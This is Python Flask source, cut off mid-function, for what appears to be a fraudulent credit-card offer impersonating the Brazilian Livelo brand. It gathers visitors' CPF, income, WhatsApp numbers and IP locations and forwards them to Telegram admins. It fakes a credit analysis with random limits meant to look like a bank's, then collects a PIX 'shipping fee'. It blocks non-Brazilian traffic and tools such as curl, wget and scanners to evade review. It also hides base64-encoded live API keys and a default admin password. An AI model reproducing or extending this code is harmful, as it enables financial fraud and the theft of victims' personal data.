"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LIVELO CREDIT SYSTEM — v2.0                                                 ║
║  Simulação de Análise de Crédito + Cobrança de Frete via PIX (C7 API)        ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ── IMPORTS ────────────────────────────────────────────────────────────────────
import os

import re, time, uuid, json, hmac, hashlib, sqlite3, secrets, logging, base64
from functools import wraps
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict

from flask import (
    Flask, request, jsonify, render_template, redirect,
    url_for, session, send_from_directory, abort, g
)
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename

try:
    import requests as _req
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

def get_secure_c7_key():
    return base64.b64decode(b'YzdfbGl2ZV84ODZhMGRkYzYwMDQwZmMzNDAxOTFkYTg3ZDg3NWMwZDczZTJhY2JiYmVhNzlhNTM0YzA3ODJhMjNiMTFiZTBk').decode("utf-8")

def get_secure_c7_secret():
    return base64.b64decode(b'NmRmMjczNzliZTI2MThiYWU0YzY5YmZmOTM2ZTA2MjQ3MjQ5M2IwZTQ0MjcxOTEyMjlhMWY0NDMyN2MzOTQ5Y2U5NzM4YmMxODI1ZjcyMWZjNDk0NzIyMzFlOWIzOWE4YWI2MmNkZTk1OGExNWEzODcxMDE4NzQyMTg3OTBlYTY=').decode("utf-8")


# ── APP SETUP ──────────────────────────────────────────────────────────────────
app = Flask(__name__, template_folder="templates", static_folder="static")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
log = logging.getLogger(__name__)

@app.before_request
def crypt_shield():
    # 1. Blindagem de GeoLocalização (Bloqueia gringos e IPs falsos)
    country = request.headers.get("x-vercel-ip-country", request.headers.get("CF-IPCountry", ""))
    if country and country.upper() != "BR":
        return "403 Forbidden - Access Denied by Geo-Shield", 403
        
    # 2. Blindagem de User-Agent (Bloqueia bots, scrapers, ferramentas de dev e tráfego falso)
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['bot', 'crawler', 'spider', 'headless', 'python', 'curl', 'wget', 'postman', 'insomnia', 'http', 'fetch', 'scan']
    if any(b in ua for b in bots) and not request.path.startswith('/telegram-webhook'):
        return "403 Forbidden - Bot Detected by Active Shield", 403

    # Ignora webhooks, arquivos estáticos e a rota pública
    if request.path.startswith('/telegram-webhook') or request.path.startswith('/static') or request.path.startswith('/api/config'):
        return
        
    # 3. Camuflagem de portas e rotas da API internas
    if request.path.startswith('/api/admin') or request.path.startswith('/api/internal'):
        secret = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
        if request.headers.get("X-Bot-Secret") != secret and not session.get("is_admin"):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            alerta = f"🚨 <b>ALERTA DE INVASÃO (BLINDAGEM AVANÇADA)</b> 🚨\n\n<b>IP:</b> <code>{ip}</code>\n<b>Alvo:</b> <code>{request.path}</code>\n<b>User-Agent:</b> <code>{request.headers.get('User-Agent')}</code>\n\n<i>Acesso Negado. Tráfego malicioso bloqueado e porta camuflada.</i>"
            import threading
            try:
                try:
                    send_telegram_notify("", alerta)
                except:
                    pass
            except Exception:
                pass
            return jsonify({"error": "ACCESS DENIED. Portas blindadas com criptografia militar."}), 401

@app.context_processor
def inject_config():
    try:
        with app.app_context():
            db = get_db()
            mgr = db.execute("SELECT * FROM manager WHERE id=1").fetchone()
            cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
            cfg = {row['key']: row['value'] for row in cfg_rows}
            return {'mgr': mgr, 'sys_config': cfg}
    except Exception:
        return {}

app.secret_key = os.environ.get("CHAVE_SECRETA", os.environ.get("SECRET_KEY", secrets.token_hex(32)))
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
    MAX_CONTENT_LENGTH=5 * 1024 * 1024,
    TEMPLATES_AUTO_RELOAD=True,
)

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("livelo")

import shutil
# ── PATHS ──────────────────────────────────────────────────────────────────────
BASE_DIR   = Path(__file__).parent
if os.environ.get("VERCEL"):
    DB_PATH = Path("/tmp/livelo.db")
    UPLOAD_DIR = Path("/tmp/uploads")
    # Copy db to tmp if not exists
    if not DB_PATH.exists() and (BASE_DIR / "livelo.db").exists():
        shutil.copy2(BASE_DIR / "livelo.db", DB_PATH)
else:
    DB_PATH    = BASE_DIR / "livelo.db"
    UPLOAD_DIR = BASE_DIR / "static" / "uploads"

try:
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    pass

ALLOWED_IMG_EXT = {"png", "jpg", "jpeg", "webp", "gif"}

# ── C7 API CONFIG ──────────────────────────────────────────────────────────────
# Credenciais lidas de variáveis de ambiente — NUNCA hardcoded.
C7_BASE_URL   = os.environ.get("C7_BASE_URL",   "https://api.carteirado7.com/v2")
C7_API_KEY    = os.environ.get("C7_API_KEY",    "")
C7_API_SECRET = os.environ.get("C7_API_SECRET", "")

# Valor do frete do cartão (configurável via env)
FRETE_VALOR = float(os.environ.get("FRETE_VALOR", "29.90"))

# ── RATE LIMIT & BRUTE FORCE ───────────────────────────────────────────────────
_RATE_DB  : Dict[str, list] = {}
_AUTH_FAIL: Dict[str, dict] = {}

def xor_crypt(text, key="livelo_secure_key_2026"):
    res = []
    for i, c in enumerate(text):
        res.append(chr(ord(c) ^ ord(key[i % len(key)])))
    return "".join(res)

def get_secure_json():
    data = request.get_json(silent=True) or {}
    if "payload" in data and len(data) == 1:
        try:
            dec_b64 = base64.b64decode(data["payload"]).decode('utf-8')
            dec_str = xor_crypt(dec_b64)
            return json.loads(dec_str)
        except:
            return {}
    return data

@app.after_request
def apply_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "SAMEORIGIN"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response

# ══════════════════════════════════════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════════════════════════════════════
def get_db() -> sqlite3.Connection:
    if "db" not in g:
        conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
        conn.row_factory = sqlite3.Row
        try:
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")
            conn.execute("PRAGMA temp_store=MEMORY")
            conn.execute("PRAGMA mmap_size=3000000000")
        except Exception:
            pass
        conn.execute("PRAGMA busy_timeout=10000")
        g.db = conn
    return g.db

@app.teardown_appcontext
def close_db(exc=None):
    db = g.pop("db", None)
    if db:
        db.close()

def get_sys_config(db):
    try:
        rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        return {r['key']: r['value'] for r in rows}
    except Exception:
        return {}

def init_db():
    with app.app_context():
        db = get_db()
        try:
            db.execute("ALTER TABLE leads ADD COLUMN location TEXT")
        except:
            pass
        try:
            db.execute("ALTER TABLE leads ADD COLUMN device_brand TEXT")
        except:
            pass

        db.executescript("""
        -- Migrations
        
        CREATE TABLE IF NOT EXISTS admin (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            username   TEXT    NOT NULL UNIQUE,
            password   TEXT    NOT NULL,
            created_at REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real))
        );

        CREATE TABLE IF NOT EXISTS manager (
            id         INTEGER PRIMARY KEY DEFAULT 1,
            name       TEXT    NOT NULL DEFAULT 'Lucas Cardoso',
            photo_url  TEXT    NOT NULL DEFAULT '/static/images/manager_default.svg',
            since_year INTEGER NOT NULL DEFAULT 2025,
            whatsapp   TEXT    NOT NULL DEFAULT '5511999999999',
            updated_at REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real))
        );

        CREATE TABLE IF NOT EXISTS sys_config (
            key TEXT PRIMARY KEY,
            value TEXT
        );

        CREATE TABLE IF NOT EXISTS leads (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id      TEXT    NOT NULL UNIQUE,
            ip              TEXT,
            cpf             TEXT,
            nome            TEXT,
            nome_mae        TEXT,
            data_nasc       TEXT,
            renda           TEXT,
            tipo_renda      TEXT,
            motivo_credito  TEXT,
            dia_vencimento  TEXT,
            whatsapp        TEXT,
            card_color      TEXT,
            card_style      TEXT,
            limite_aprovado TEXT,
            payment_id      TEXT,
            pix_status      TEXT    DEFAULT 'pending',
            utm_source      TEXT,
            utm_medium      TEXT,
            utm_campaign    TEXT,
            utm_content     TEXT,
            utm_term        TEXT,
            src             TEXT,
            sck             TEXT,
            created_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
            updated_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
            location        TEXT,
            device_brand    TEXT,
            tg_message_id   TEXT,
            tg_chat_id      TEXT
        );
        """)
        
        try:
            db.execute("ALTER TABLE leads ADD COLUMN tg_message_id TEXT;")
        except: pass
        try:
            db.execute("ALTER TABLE leads ADD COLUMN tg_chat_id TEXT;")
        except: pass

        db.executescript("""
        CREATE TABLE IF NOT EXISTS telegram_admins (
            tg_id TEXT PRIMARY KEY,
            first_name TEXT,
            username TEXT,
            photo_url TEXT,
            role TEXT DEFAULT 'basic',
            status TEXT DEFAULT 'active',
            last_active REAL
        );

        CREATE TABLE IF NOT EXISTS otp_tokens (
            token_hash TEXT PRIMARY KEY,
            role TEXT,
            expires_at REAL,
            used INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS payments (
            payment_id   TEXT PRIMARY KEY,
            c7_id        TEXT,
            session_id   TEXT,
            amount       REAL,
            status       TEXT DEFAULT 'pending',
            pix_code     TEXT,
            qr_code_url  TEXT,
            expires_at   TEXT,
            payer_name   TEXT,
            payer_cpf    TEXT,
            created_at   REAL NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
            confirmed_at REAL
        );

        CREATE INDEX IF NOT EXISTS idx_leads_session ON leads(session_id);
        CREATE INDEX IF NOT EXISTS idx_leads_cpf     ON leads(cpf);
        CREATE INDEX IF NOT EXISTS idx_pay_session   ON payments(session_id);
        """)
        
        try:
            db.execute("ALTER TABLE leads ADD COLUMN location TEXT")
        except Exception:
            pass
            
        db.commit()

        # Seed default admin
        if not db.execute("SELECT id FROM admin LIMIT 1").fetchone():
            db.execute(
                "INSERT INTO admin(username,password) VALUES(?,?)",
                ("admin", generate_password_hash("livelo2025"))
            )
            db.commit()
            log.info("[BOOT] Admin padrão criado → user: admin / pass: livelo2025")

        # Seed manager
        if not db.execute("SELECT id FROM manager WHERE id=1").fetchone():
            db.execute("""
                INSERT INTO manager(id,name,photo_url,since_year,whatsapp)
                VALUES(1,'Lucas Cardoso','/static/images/Avatar_Gerente.png',2025,'5511999999999')
            """)
            db.commit()

        # Seed config
        if not db.execute("SELECT key FROM sys_config WHERE key='favicon_url'").fetchone():
            db.execute("INSERT INTO sys_config(key, value) VALUES('favicon_url', '/static/favicon.ico')")
            db.commit()

        # ── Auto-seed: garante que SUPREME_ADMIN_ID e TELEGRAM_BOT_TOKEN do .env
        # estejam sempre no banco para as funções de notificação encontrarem ──────
        supreme_env = (
            os.environ.get("SUPREME_ADMIN_ID")
            or os.environ.get("ID_ADMIN_SUPREMO")
            or os.environ.get("ADMIN_CHAT_ID")
        )
        if supreme_env:
            existing = db.execute("SELECT value FROM sys_config WHERE key='admin_chat_id'").fetchone()
            if not existing or not existing["value"]:
                db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('admin_chat_id', ?)", (supreme_env,))
                db.commit()
                log.info("[BOOT] admin_chat_id salvo no sys_config: %s", supreme_env)

        tg_token_env = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN")
        if tg_token_env:
            existing_tk = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
            if not existing_tk or not existing_tk["value"]:
                db.execute("INSERT OR REPLACE INTO sys_config(key, value) VALUES('telegram_token', ?)", (tg_token_env,))
                db.commit()
                log.info("[BOOT] telegram_token salvo no sys_config.")

# ══════════════════════════════════════════════════════════════════════════════
#  SEGURANÇA
# ══════════════════════════════════════════════════════════════════════════════
def _ip() -> str:
    return (
        request.headers.get("CF-Connecting-IP") or
        request.headers.get("X-Real-IP") or
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
        request.remote_addr or "0.0.0.0"
    )

def is_rate_limited(ip: str, limit: int = 60, window: int = 60) -> bool:
    now = time.time()
    ts  = [t for t in _RATE_DB.get(ip, []) if now - t < window]
    if len(ts) >= limit:
        _RATE_DB[ip] = ts
        return True
    ts.append(now)
    _RATE_DB[ip] = ts
    return False

def is_blocked(ip: str) -> bool:
    return _AUTH_FAIL.get(ip, {}).get("blocked_until", 0) > time.time()

def record_auth_fail(ip: str):
    now = time.time()
    rec = _AUTH_FAIL.get(ip, {"count": 0, "blocked_until": 0, "first": now})
    if now - rec.get("first", now) > 600:
        rec = {"count": 0, "blocked_until": 0, "first": now}
    rec["count"] += 1
    if rec["count"] >= 5:
        rec["blocked_until"] = now + 1800
        log.warning("[SEC] IP %s bloqueado por brute-force", ip)
    _AUTH_FAIL[ip] = rec

def reset_auth_fail(ip: str):
    _AUTH_FAIL.pop(ip, None)

def sanitize(val: str, max_len: int = 200) -> str:
    if not isinstance(val, str):
        val = str(val)
    return re.sub(r"[<>\"\\'`;]", "", val).strip()[:max_len]

def require_admin(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if not session.get("admin_id"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return wrapped

# ══════════════════════════════════════════════════════════════════════════════
#  VALIDAÇÕES
# ══════════════════════════════════════════════════════════════════════════════
def validate_cpf(cpf: str) -> bool:
    cpf = re.sub(r"\D", "", cpf)
    if len(cpf) != 11 or cpf == cpf[0] * 11:
        return False
    def _d(digits, n):
        s = sum(int(d) * (n - i) for i, d in enumerate(digits))
        r = (s * 10) % 11
        return 0 if r >= 10 else r
    return _d(cpf[:9], 10) == int(cpf[9]) and _d(cpf[:10], 11) == int(cpf[10])



def send_telegram_notify(session_id, event_type="ENTRY"):
    """Envia notificação Telegram síncrona — chamada dentro do request context Flask."""
    try:
        import requests as _rq

        db = get_db()
        cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
        cfg = {r["key"]: r["value"] for r in cfg_rows}

        # ── Token do Bot ──────────────────────────────────────────────────────
        bot_token = (
            cfg.get("telegram_token")
            or os.environ.get("TELEGRAM_BOT_TOKEN")
            or os.environ.get("BOT_TOKEN")
        )
        if not bot_token:
            log.warning("[TG] Sem bot_token — notificação ignorada (event=%s)", event_type)
            return

        # ── session_id vazio → ignora ─────────────────────────────────────────
        if not session_id:
            return

        lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
        if not lead:
            log.warning("[TG] Lead não encontrado para session_id=%s", session_id)
            return

        pay = db.execute(
            "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
            (session_id,)
        ).fetchone()

        # ── Resolve destino ───────────────────────────────────────────────────
        supreme_id = (
            cfg.get("admin_chat_id")
            or cfg.get("supreme_admin_id")
            or os.environ.get("SUPREME_ADMIN_ID")
            or os.environ.get("ID_ADMIN_SUPREMO")
            or os.environ.get("ADMIN_CHAT_ID")
        )
        log_channel = None
        if event_type in ["PIX_PAID", "PIX_GENERATED"]:
            log_channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
        elif event_type == "ENTRY" or str(event_type).startswith("STEP_ACTION"):
            log_channel = cfg.get("tg_log_acessos") or cfg.get("tg_log_channel")
        else:
            log_channel = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")

        if not supreme_id and not log_channel:
            log.warning("[TG] Nenhum destino configurado — supreme_id=%s log=%s", supreme_id, log_channel)
            return

        # ── Geolocalização ────────────────────────────────────────────────────
        geo_link = "N/A"
        if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
            try:
                ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
                if ip_data.get("status") == "success":
                    lat, lon = ip_data.get("lat"), ip_data.get("lon")
                    city, country = ip_data.get("city"), ip_data.get("country")
                    geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country} (Ver Satélite)</a>"
            except Exception:
                pass

        import datetime
        agora = datetime.datetime.now().strftime("%d/%m/%Y às %H:%M:%S")

        icons = {"ENTRY": "🟢", "CARD_CHOSEN": "💳", "PIX_GENERATED": "⏳", "PIX_PAID": "✅", "INFO_ADDED": "📝"}
        icon = icons.get(event_type, "ℹ️")
        if str(event_type).startswith("STEP_ACTION"):
            icon = "🖱️"
            if "ABANDONO" in event_type:
                icon = "🚨"

        titulo = "RASTREAMENTO DE LEAD"
        if event_type == "ENTRY":           titulo = "🟢 NOVO ACESSO IDENTIFICADO"
        elif event_type == "CARD_CHOSEN":   titulo = "💳 CARTÃO ESCOLHIDO"
        elif event_type == "INFO_ADDED":    titulo = "📝 WHATSAPP / DADOS INFORMADOS"
        elif event_type == "PIX_GENERATED": titulo = "⏳ PIX GERADO"
        elif event_type == "PIX_PAID":      titulo = "✅ PAGAMENTO CONFIRMADO"
        elif "ABANDONO" in event_type:      titulo = "🚨 LEAD ABANDONOU O FUNIL"

        texto  = f"{icon} <b>{titulo}</b> {icon}\n\n"
        texto += f"🕒 <b>Data/Hora:</b> {agora}\n"
        texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
        texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
        if lead.get("whatsapp"):
            cwa = re.sub(r"\D", "", lead["whatsapp"])
            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a> ✅\n"
        texto += f"💻 <b>Dispositivo:</b> {lead.get('device_brand') or 'Desconhecido'}\n"
        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n"
        if geo_link != "N/A":
            texto += f"📍 <b>Localização:</b> {geo_link}\n"

        texto += f"\n📊 <b>STATUS DO FUNIL:</b>\n"
        texto += f"✅ <b>Acesso Inicial:</b> Concluído\n"
        if lead["cpf"]:           texto += f"✅ <b>CPF:</b> {lead['cpf']}\n"
        if lead["renda"]:         texto += f"✅ <b>Renda:</b> R$ {lead['renda']}\n"
        if lead["tipo_renda"]:    texto += f"✅ <b>Ocupação:</b> {lead['tipo_renda']}\n"
        if lead["motivo_credito"]: texto += f"✅ <b>Motivo:</b> {lead['motivo_credito']}\n"
        if lead["dia_vencimento"]: texto += f"✅ <b>Vencimento:</b> Dia {lead['dia_vencimento']}\n"
        if lead["limite_aprovado"]: texto += f"🎯 <b>Limite:</b> R$ {lead['limite_aprovado']}\n"
        if lead["card_style"]:
            texto += f"\n💳 <b>CARTÃO:</b> {lead['card_style']} ({lead['card_color']})\n"
        if pay:
            texto += f"\n💸 <b>PAGAMENTO:</b>\n"
            texto += f"💵 <b>Valor:</b> R$ {pay['amount']}\n"
            st = lead["pix_status"]
            texto += f"🚦 <b>Status:</b> {'✅ PAGO!' if st in ['paid','completed'] else '⏳ AGUARDANDO'}\n"
            texto += f"🆔 <b>ID:</b> <code>{pay['payment_id']}</code>\n"

        base_payload = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}

        # ── Envia para canal de log ───────────────────────────────────────────
        if log_channel:
            lp = dict(base_payload, chat_id=log_channel)
            msg_id  = lead.get("tg_message_id")
            tg_chat = lead.get("tg_chat_id")
            sent_ok = False
            if msg_id and str(tg_chat) == str(log_channel):
                lp["message_id"] = msg_id
                r = _rq.post(f"https://api.telegram.org/bot{bot_token}/editMessageText", json=lp, timeout=4)
                if r.json().get("ok"):
                    sent_ok = True
                else:
                    lp.pop("message_id", None)
            if not sent_ok:
                r = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=lp, timeout=4)
                rj = r.json()
                if rj.get("ok") and "result" in rj:
                    db.execute("UPDATE leads SET tg_message_id=?, tg_chat_id=? WHERE session_id=?",
                               (rj["result"]["message_id"], log_channel, session_id))
                    db.commit()
                else:
                    log.warning("[TG] Erro log_channel %s: %s", log_channel, rj.get("description"))

        # ── Envia para admin supremo ──────────────────────────────────────────
        if supreme_id:
            sp = dict(base_payload, chat_id=supreme_id)
            r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=sp, timeout=4)
            if not r2.json().get("ok"):
                log.warning("[TG] Erro supreme_id %s: %s", supreme_id, r2.json().get("description"))
            else:
                log.info("[TG] '%s' enviado → %s", event_type, supreme_id)

    except Exception as e:
        log.error("[TG] send_telegram_notify ERRO: %s", e, exc_info=True)


def send_telegram_report(session_id, is_paid=False):
    """Relatório de PIX gerado / pago — chamada síncrona dentro do request context."""
    try:
        _send_telegram_report_inner(session_id, is_paid)
    except Exception as e:
        log.error("[TG] send_telegram_report ERRO: %s", e, exc_info=True)

def _send_telegram_report_inner(session_id, is_paid=False):
    import requests as _rq

    db = get_db()
    cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
    cfg = {r["key"]: r["value"] for r in cfg_rows}

    channel = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
    supreme_id = (
        cfg.get("admin_chat_id")
        or cfg.get("supreme_admin_id")
        or os.environ.get("SUPREME_ADMIN_ID")
        or os.environ.get("ID_ADMIN_SUPREMO")
        or os.environ.get("ADMIN_CHAT_ID")
    )

    if not channel:
        channel = supreme_id
    if not channel and not supreme_id:
        log.warning("[TG] report: sem destino (session=%s)", session_id)
        return

    thread_id = cfg.get("tg_log_thread_id")
    bot_token = (
        cfg.get("telegram_token")
        or os.environ.get("TELEGRAM_BOT_TOKEN")
        or os.environ.get("BOT_TOKEN")
    )
    if not bot_token:
        log.warning("[TG] report: sem bot_token")
        return

    lead = db.execute("SELECT * FROM leads WHERE session_id=?", (session_id,)).fetchone()
    if not lead:
        log.warning("[TG] report: lead nao encontrado (session=%s)", session_id)
        return
    pay = db.execute(
        "SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1",
        (session_id,)
    ).fetchone()

    status_icon = "PAGO" if is_paid else "AGUARDANDO PIX"
    import datetime
    agora = datetime.datetime.now().strftime("%d/%m/%Y as %H:%M:%S")

    geo_link = "N/A"
    if lead["ip"] and lead["ip"] not in ["127.0.0.1", "localhost"]:
        try:
            ip_data = _rq.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
            if ip_data.get("status") == "success":
                lat, lon = ip_data.get("lat"), ip_data.get("lon")
                city, country = ip_data.get("city"), ip_data.get("country")
                geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country}</a>"
        except Exception:
            pass

    titulo = "NOVA VENDA CONFIRMADA!" if is_paid else "PIX GERADO COM SUCESSO!"
    texto = f"<b>{titulo}</b>\n\n"
    texto += (
        f"Data/Hora: {agora}\n"
        f"Nome: {lead['nome'] or '?'}\n"
        f"CPF: <code>{lead['cpf'] or '?'}</code>\n"
    )
    if lead.get("whatsapp"):
        import re as _re
        cwa = _re.sub(r"\D", "", lead["whatsapp"])
        texto += f"WhatsApp: <a href='https://wa.me/55{cwa}'>{lead['whatsapp']}</a>\n"
    texto += (
        f"Renda: R$ {lead['renda'] or 'Nao inf.'}\n"
        f"Limite: R$ {lead['limite_aprovado'] or 'Nao inf.'}\n"
        f"Cartao: {lead['card_style'] or '-'} ({lead['card_color'] or '-'})\n"
        f"Aparelho: {lead.get('device_brand') or 'Desconhecido'}\n"
        f"IP: <code>{lead['ip'] or '?'}</code> - {geo_link}\n"
        f"Status PIX: {status_icon}\n"
    )
    if pay:
        texto += f"Valor: R$ {pay['amount']}\n"
        texto += f"ID Pgto: <code>{pay['payment_id']}</code>\n"

    base = {"text": texto, "parse_mode": "HTML", "disable_web_page_preview": True}
    if channel:
        pl = dict(base, chat_id=channel)
        if thread_id:
            pl["message_thread_id"] = thread_id
        r1 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=pl, timeout=5)
        if r1.json().get("ok"):
            log.info("[TG] report canal %s OK", channel)
        else:
            log.warning("[TG] report canal erro: %s", r1.json().get("description"))
    if supreme_id and str(supreme_id) != str(channel):
        r2 = _rq.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",
                      json=dict(base, chat_id=supreme_id), timeout=5)
        if r2.json().get("ok"):
            log.info("[TG] report supreme %s OK", supreme_id)
        else:
            log.warning("[TG] report supreme erro: %s", r2.json().get("description"))

def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
    import random
    
    # 1. Parsing avançado da Renda (os botões enviam 1000, 2000, 4000, 8000)
    try:
        r_val = float(renda.replace("R$", "").replace(".", "").replace(",", ".").strip())
    except:
        r_val = 1500.0

    # Base de cálculo reduzida para valores mais realistas
    base_limite = r_val * random.uniform(0.08, 0.25)
    
    tipo = tipo_renda.lower()
    motivo_lower = motivo.lower()
    
    # 2. Multiplicador de Estabilidade Empregatícia
    estabilidade = 1.0
    if any(x in tipo for x in ["servidor", "público", "aposentado"]):
        estabilidade = 1.5  # Alta estabilidade = Risco Menor
    elif any(x in tipo for x in ["clt", "carteira assinada"]):
        estabilidade = 1.2  # Estabilidade média
    elif any(x in tipo for x in ["empresário", "empreendedor", "cnpj", "dono"]):
        estabilidade = 1.0  # Boa renda, mas variável
    elif any(x in tipo for x in ["autônomo", "freelancer", "informal"]):
        estabilidade = 0.7  # Risco maior
    elif any(x in tipo for x in ["estudante", "desempregado"]):
        estabilidade = 0.3  # Risco muito alto
        base_limite = min(base_limite, 500) # trava estrita para desempregados

    # 3. Análise de Risco pelo Motivo do Crédito
    fator_risco = 1.0
    if "viagem" in motivo_lower:
        fator_risco = 1.1  
    elif "específica" in motivo_lower:
        fator_risco = 1.0  
    elif "organizar" in motivo_lower or "dívida" in motivo_lower:
        fator_risco = 0.6   # Sinal vermelho forte (corta quase pela metade)
    
    # Cálculo final do Limite
    limite = base_limite * estabilidade * fator_risco
    
    # Teto máximo rigoroso de acordo com a renda
    if r_val <= 1000:
        # Se ganha 1000, limite não deve passar muito de 150 a 300
        limite = min(limite, random.uniform(150, 300))
    elif r_val <= 2000:
        # Se ganha 2000, limite não deve passar de 400 a 700
        limite = min(limite, random.uniform(400, 700))
    elif r_val <= 4000:
        limite = min(limite, random.uniform(800, 1500))
    else:
        # Acima de 4000, teto máximo fixado no sistema
        limite = min(limite, random.uniform(1500, 2800))
        
    # Limites Hardcodes de Segurança lógicos
    if limite < 150: 
        limite = random.choice([150, 200])  # Limite mínimo absoluto
        
    # Arredondamento charmoso para parecer análise de banco real (finais em 00 ou 50)
    limite = round(limite / 50) * 50
    
    # Definição de Tier para uso futuro
    if limite < 1000:
        tier = "Bronze"
    elif limite < 3000:
        tier = "Prata"
    elif limite < 8000:
        tier = "Ouro"
    else:
        tier = "Black"

    try:
        db = get_db()
        row = db.execute("SELECT value FROM sys_config WHERE key='frete_expresso'").fetchone()
        if row and row["value"]:
            frete = float(row["value"].replace(",", "."))
        else:
            frete = float(os.environ.get("FRETE_VALOR", "29.90").replace(",", "."))
    except:
        frete = 29.90
        
    return {"limite": limite, "frete": frete, "tier": tier}

# ── API CPF ───────────────────────────────────────────────────────────────
@app.route("/api/cpf", methods=["POST"])
def api_cpf():
    data = get_secure_json()
    
    # Inicia o warmup do PIX C7 em background assim que o lead entra no funil
    try:
        import threading, requests
        warmup_url = request.url_root.replace("http://", "https://").rstrip('/') + "/api/c7/warmup"
        threading.Thread(target=lambda: requests.post(warmup_url, json={}, timeout=2)).start()
    except: pass

    cpf_raw = sanitize(data.get("cpf", ""))
    cpf_val = re.sub(r"\D", "", cpf_raw)
    
    # Validação local do dígito verificador antes de enviar para a API (evitar erros 422 e consumo)
    def is_valid_cpf_local(c):
        if len(c) != 11 or c == c[0]*11: return False
        try:
            c_int = [int(x) for x in c]
            for j in range(9, 11):
                v = sum((c_int[i] * ((j + 1) - i) for i in range(j))) % 11
                if c_int[j] != (11 - v if v > 1 else 0): return False
            return True
        except: return False

    if not is_valid_cpf_local(cpf_val):
        return jsonify({"ok": False, "error": "CPF inválido. Verifique os números digitados."}), 400

    api_key = os.environ.get("CPFHUB_API_KEY")
    if not api_key:
        # Fallback local seguro caso a API Key não esteja configurada no ambiente
        return jsonify({
            "ok": True,
            "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
            "nome": "Cliente",
            "nome_mae": "",
            "data_nasc": "01/01/1990"
        })

    import urllib.request
    import urllib.error
    import json
    import time

    url = f"https://api.cpfhub.io/cpf/{cpf_val}"
    req = urllib.request.Request(url, headers={"x-api-key": api_key, "User-Agent": "Backend/1.0"})
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            with urllib.request.urlopen(req, timeout=10) as response:
                body = json.loads(response.read().decode("utf-8"))
                
                if body.get("success"):
                    d = body.get("data", {})
                    # Incrementa chamadas apenas se sucesso (ignora falhas no BD)
                    try:
                        db = get_db()
                        db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
                        db.commit()
                    except: pass

                    return jsonify({
                        "ok": True,
                        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
                        "nome": d.get("nameUpper", d.get("name", "Cliente")),
                        "nome_mae": "",
                        "data_nasc": d.get("birthDate", "01/01/1990")
                    })
                else:
                    err_msg = body.get("error", "Erro desconhecido")
                    if isinstance(err_msg, dict):
